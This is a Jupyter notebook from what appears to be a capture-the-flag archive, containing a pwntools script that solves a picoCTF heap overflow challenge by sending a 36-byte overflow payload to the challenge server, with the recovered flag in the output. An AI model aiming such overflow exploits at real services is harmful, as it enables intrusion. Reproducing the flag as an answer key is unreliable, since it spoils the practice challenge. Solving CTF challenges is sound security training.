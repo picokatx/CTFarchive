{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to tethys.picoctf.net on port 63811\n",
      "[x] Opening connection to tethys.picoctf.net on port 63811: Trying 3.140.72.182\n",
      "[+] Opening connection to tethys.picoctf.net on port 63811: Done\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'picoCTF{my_first_heap_overflow_749119de}\\n'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwnlib.tubes.remote import remote\n",
    "r = remote(\"tethys.picoctf.net\", 63811)\n",
    "r.recvuntil(b\"Enter your choice: \")\n",
    "r.sendline(b\"2\")\n",
    "r.recvuntil(b\"Data for buffer: \")\n",
    "r.sendline(b\"a\"*32+b\"flag\")\n",
    "r.recvuntil(b\"Enter your choice: \")\n",
    "r.sendline(b\"4\")\n",
    "r.recvline()\n",
    "r.recvline()\n",
    "r.recvline()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
